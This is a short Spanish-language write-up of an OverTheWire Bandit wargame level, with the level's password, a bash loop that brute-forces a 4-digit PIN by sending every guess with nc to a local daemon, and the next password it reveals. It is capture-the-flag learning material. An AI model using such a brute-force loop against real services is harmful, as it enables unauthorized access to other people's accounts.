# Bandit Level

## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Cosas utilies
user: bandit24
passweord: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solucion
``` bash
bandit24@bandit:~$ mkdir /tmp/bandit_24_25
bandit24@bandit:~$ cd /tmp/bandit_24_25
bandit24@bandit:/tmp/bandit_24_25$ nano script.sh

// THIS IS TH CONTENT OF THE FILE script.sh
#!bin/bash
password="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
for i in {0..9}{0..9}{0..9}{0..9}
do
    echo $password' '$i | nc localhost 30002 >> res.txt &
done


bandit24@bandit:/tmp/bandit_24_25$ bash script.sh
bandit24@bandit:/tmp/bandit_24_25$ sort res.txt | uniq -u

!Correct
The password of unser bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d




```

## Notas
1. Nano es un editor de textos que viene instalado en casi todos las distribuciones de linux.
2. La notación de {0..9} significa generar todos los elementos desde el 0 hasta el 9, si los valores fueran de 000..999 se refiere a todos los números desde el 0 hasta el 999.
3. El signo & significa que una tarea se deja ejecutandose en paralelo.
